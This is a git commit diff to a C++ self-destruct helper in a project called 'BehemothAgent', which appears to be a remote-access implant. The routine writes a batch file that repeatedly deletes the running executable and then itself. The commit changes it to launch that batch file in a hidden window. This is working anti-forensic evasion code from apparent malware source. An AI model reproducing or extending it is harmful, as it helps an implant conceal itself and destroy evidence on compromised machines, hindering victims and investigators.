3b56b32ba956953ea59920a1ea0dda9ddc0deae6
constant <51972282+0xConstant@users.noreply.github.com>
2023-09-05 18:01:31 -0400

    Update self_dest.cpp

--- BehemothAgent_v2.0/Helpers/self_dest.cpp
+++ BehemothAgent_v2.0/Helpers/self_dest.cpp
@@ -4,6 +4,12 @@
 #include "self_dest.h"
 
 
+#include <Windows.h>
+#include <iostream>
+#include <fstream>
+#include <shellapi.h>  // Necessary for ShellExecute
+#include "self_dest.h"
+
 void self_destruct() {
     // Get the full path of the current executable
     char executablePath[MAX_PATH];
@@ -16,16 +22,17 @@ void self_destruct() {
         return;
     }
 
-    // Write commands to the batch file to delete the executable and the batch file
+    // Write commands to the batch file to delete the executable and then the batch file itself
     batchFile << "@echo off\n";
+    batchFile << "timeout /T 5\n";  // wait for 5 seconds
     batchFile << ":retry\n";
     batchFile << "del \"" << executablePath << "\"\n";
     batchFile << "if exist \"" << executablePath << "\" goto retry\n";
-    batchFile << "del \"%~f0\"\n";
+    batchFile << "del \"%~f0\"\n";  // Delete the batch file itself
     batchFile.close();
 
-    // Start the batch file
-    system("start delete.bat");
+    // Start the batch file hidden using ShellExecute
+    ShellExecuteA(NULL, "open", "delete.bat", NULL, NULL, SW_HIDE);
 
     // Exit the program
     exit(0);
